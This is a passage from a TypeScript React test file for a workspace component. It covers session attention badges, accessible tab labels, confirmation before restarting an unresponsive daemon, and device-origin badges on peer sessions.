    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore + 1);
  });

  describe("session attention badges", () => {
    const attentionSession = (
      id: string,
      title: string,
      reason: "finished" | "error" | "permission",
    ): Session => ({
      ...acpSession(id, title),
      attention: { reason, atMs: 1_000 },
    });

    it("renders an attention badge on tabs that carry attention and none on tabs without", async () => {
      vi.mocked(sessionsList).mockResolvedValue([
        attentionSession("session-a", "agent finished", "finished"),
        attentionSession("session-b", "agent error", "error"),
        attentionSession("session-c", "agent permission", "permission"),
        acpSession("session-d", "agent quiet"),
      ]);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const findTab = (title: string): HTMLButtonElement => {
        const tab = [
          ...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab"),
        ].find((candidate) => candidate.textContent?.includes(title));
        if (tab === undefined) throw new Error(`tab for ${title} did not render`);
        return tab;
      };

      expect(findTab("agent finished").querySelector(".workspace-tab-attention")?.textContent).toBe(
        "finished",
      );
      expect(findTab("agent error").querySelector(".workspace-tab-attention")?.textContent).toBe(
        "error",
      );
      expect(
        findTab("agent permission").querySelector(".workspace-tab-attention")?.textContent,
      ).toBe("needs approval");
      const quiet = findTab("agent quiet");
      expect(quiet.querySelector(".workspace-tab-attention")).toBeNull();
    });

    it("says the reason in the tab's accessible name, not only by colour", async () => {
      vi.mocked(sessionsList).mockResolvedValue([
        attentionSession("session-a", "agent blocked", "permission"),
      ]);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const tab = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")][0];
      if (tab === undefined) throw new Error("attention tab did not render");
      // The tab has no aria-label override, so its accessible name is built
      // from its text content — which must carry the reason, not just a colour.
      expect(tab.getAttribute("aria-label")).toBeNull();
      expect(tab.textContent).toContain("agent blocked");
      expect(tab.textContent).toContain("needs approval");
    });
  });

  describe("daemon unresponsive recovery", () => {
    const UNRESPONSIVE_MESSAGE = "the daemon stopped answering";

    beforeEach(() => {
      vi.mocked(daemonStatus).mockResolvedValue({
        state: "unresponsive",
        pid: 42,
        instanceId: "daemon-test",
        protocolVersion: 1,
        clients: 1,
        capabilities: ["typed_permissions"],
        message: UNRESPONSIVE_MESSAGE,
      });
    });

    it("shows the daemon's unresponsive sentence verbatim in the status strip", async () => {
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const strip = container.querySelector(".workspace-daemon-status");
      if (strip === null) throw new Error("daemon status strip did not render");
      expect(strip.textContent).toContain(UNRESPONSIVE_MESSAGE);
    });

    it("asks once when a session is live, and a decline keeps the state visible without restarting", async () => {
      vi.mocked(ask).mockResolvedValue(false);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      // The default roster has one live terminal session, so the destructive
      // restart must not happen on its own.
      expect(daemonRestart).not.toHaveBeenCalled();
      expect(ask).toHaveBeenCalledTimes(1);
      const message = String(vi.mocked(ask).mock.calls[0]?.[0]);
      expect(message).toContain("stop");
      expect(message).toContain("conversations are kept");

      // The state stays visible after the decline instead of disappearing.
      const strip = container.querySelector(".workspace-daemon-status");
      if (strip === null) throw new Error("daemon status strip did not render");
      expect(strip.textContent).toContain(UNRESPONSIVE_MESSAGE);
    });

    it("restarts without asking when no session is live", async () => {
      vi.mocked(sessionsList).mockResolvedValue([]);
      vi.mocked(ask).mockResolvedValue(true);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      expect(daemonRestart).toHaveBeenCalledTimes(1);
      expect(ask).not.toHaveBeenCalled();
    });

    it("says a restart attempt did not complete when the command rejects", async () => {
      vi.mocked(sessionsList).mockResolvedValue([]);
      vi.mocked(daemonRestart).mockRejectedValue(new Error("daemon identity changed"));
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const strip = container.querySelector(".workspace-daemon-status");
      if (strip === null) throw new Error("daemon status strip did not render");
      // Both facts at once: the daemon's own sentence and the failed attempt.
      expect(strip.textContent).toContain(UNRESPONSIVE_MESSAGE);
      expect(strip.textContent).toContain("a restart was attempted, but it did not complete");
    });
  });

  it("shows no origin badge on a local session's tab", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const tab = container.querySelector(".workspace-session-tab");
    if (tab === null) throw new Error("session tab did not render");
    expect(tab.querySelector(".session-origin-badge")).toBeNull();
  });

  it("names the device on a peer session's tab", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("peer-session", "remote shell"),
        origin: { kind: "peer", deviceId: "device-phone", role: "client" },
      },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    // Two ticks: the tab renders from the session list, and the badge is named
    // by the devices read the same connection started.
    await act(async () => undefined);
    await act(async () => undefined);

    const badge = container.querySelector<HTMLElement>(
      ".workspace-session-tab .session-origin-badge",
    );
    expect(badge?.textContent).toBe("from Xiaomi 14");
    // The name comes from the devices list, which the connection loads once.
    expect(devicesList).toHaveBeenCalledTimes(1);
  });

  it("falls back to the device id for a device the list does not know", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("peer-session", "remote shell"),
        origin: { kind: "peer", deviceId: "device-unseen", role: "daemon" },
      },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const badge = container.querySelector<HTMLElement>(
      ".workspace-session-tab .session-origin-badge",
    );
    expect(badge?.textContent).toBe("from device-unseen");
  });
});
